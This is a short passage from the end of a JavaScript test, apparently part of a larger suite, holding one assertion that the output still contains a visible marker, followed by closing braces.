      assert.ok(out.includes(MARKER), `visible marker lost: ${doc}`);
    }
  });
});
